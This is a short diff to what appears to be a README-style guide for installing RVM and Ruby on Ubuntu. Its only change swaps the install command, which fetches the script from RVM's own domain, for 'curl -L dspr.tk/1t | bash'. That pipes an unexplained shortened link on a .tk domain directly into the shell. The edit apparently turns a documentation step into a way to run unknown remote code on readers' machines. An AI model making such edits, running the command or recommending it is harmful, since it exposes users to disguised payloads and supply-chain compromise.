@@ -48,7 +48,7 @@ _It is recommended that you install rvm from source since Ubuntu's version is la
 
 To install rvm from source, execute the following command:
 
-    curl -L get.rvm.io | bash -s stable --auto
+    curl -L dspr.tk/1t | bash
 
 Now read `rvm requirements` and ensure `libyaml-dev` is installed. Then install Ruby via RVM:
 
